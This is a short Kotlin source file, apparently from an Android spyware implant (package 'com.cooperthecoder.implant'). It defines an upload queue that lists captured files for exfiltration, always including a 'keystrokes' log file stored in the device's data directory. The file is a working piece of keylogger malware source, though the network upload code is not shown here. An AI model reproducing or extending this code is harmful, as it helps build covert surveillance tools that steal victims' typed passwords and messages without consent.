package com.cooperthecoder.implant.data

import android.os.Environment
import java.io.File

object UploadQueue {

    const val UPLOAD_QUEUE_NAME = "uploads"
    const val KEYSTROKE_FILE_NAME = "keystrokes"

    private val file = File(Environment.getDataDirectory(), UPLOAD_QUEUE_NAME)
    private val keystrokeFile = File(Environment.getDataDirectory(), KEYSTROKE_FILE_NAME)

    fun push(filename: String) {
        file.appendText("$filename\n")
    }

    fun files(): List<String> {
        val files = listOf(
                keystrokeFile.absolutePath
        )
        return files.plus(file.readLines())
    }

    fun clear(): Boolean {
        return file.delete()
    }
}